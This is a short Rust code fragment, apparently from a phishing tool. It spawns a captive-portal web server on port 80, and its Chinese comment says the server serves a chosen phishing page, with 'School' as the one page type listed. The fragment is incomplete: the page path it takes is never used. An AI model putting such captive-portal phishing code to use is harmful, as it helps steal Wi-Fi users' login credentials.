use std::path::Path;
use std::process::Command;

fn start_server(server_path: &Path, pages_path: &Path) {
    // 启动强制门户网页服务器，并且使用指定的钓鱼页面
    Command::new(server_path)
        .arg("-p")
        .arg("80")
        .arg("-n")
        .arg("-o")
        .spawn()
        .expect("Failed to start the web server");
}

mod page_type {
    enum PageType {
        School,
    }
}
